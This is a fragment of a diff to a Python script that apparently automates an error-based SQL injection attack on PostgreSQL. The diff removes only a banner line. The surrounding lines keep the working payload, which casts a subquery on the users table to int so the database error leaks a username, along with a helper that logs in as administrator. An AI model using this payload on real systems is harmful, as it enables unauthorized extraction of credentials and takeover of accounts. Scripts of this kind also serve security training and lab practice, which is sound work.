@@ -47,7 +47,6 @@ def login_as_administrator(password):
 
 # Final Execution Part
 def main():
-    print("=== PostgreSQL Error‑Based Extraction (CAST to int) ===\n")
     print("[*] Extracting username from users table (LIMIT 1)...")
     payload_username = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
     username = extract_from_error(payload_username)
